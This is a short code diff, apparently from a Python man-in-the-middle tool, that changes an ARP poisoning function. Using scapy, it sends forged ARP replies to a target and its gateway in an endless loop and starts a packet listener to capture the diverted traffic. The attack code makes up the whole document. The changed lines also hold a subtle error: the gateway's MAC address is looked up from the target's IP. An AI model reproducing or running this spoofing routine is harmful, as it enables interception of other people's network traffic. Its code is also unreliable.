@@ -45,8 +45,7 @@ if net=="1":
 else:
 	pass
 
-def arp_zehir(gatewayip,targetip):
-	targetmac=get_mac_address(targetip)
+def arp_zehir(gatewayip,targetip,targetmac):
 	arpresponse = scapy.ARP(op=2,psrc=gatewayip,pdst=targetip,hwdst=targetmac)
 	scapy.send(arpresponse,verbose=False)
 number=0
@@ -56,9 +55,11 @@ try:
 		pass
 	else:
 		subprocess.Popen(["xfce4-terminal", "-e", "python /root/Desktop/mMitm/packet_listener.py"], stdout=subprocess.PIPE)
+	targetmac=get_mac_address(targetip)
+	gatewaymac=get_mac_address(targetip)
 	while True:
-		arp_zehir(gatewayip,targetip)
-		arp_zehir(targetip,gatewayip)
+		arp_zehir(gatewayip,targetip,targetmac)
+		arp_zehir(targetip,gatewayip,gatewaymac)
 		time.sleep(1)
 		number+=2
 		print("\rSending packets " + str(number),end="")
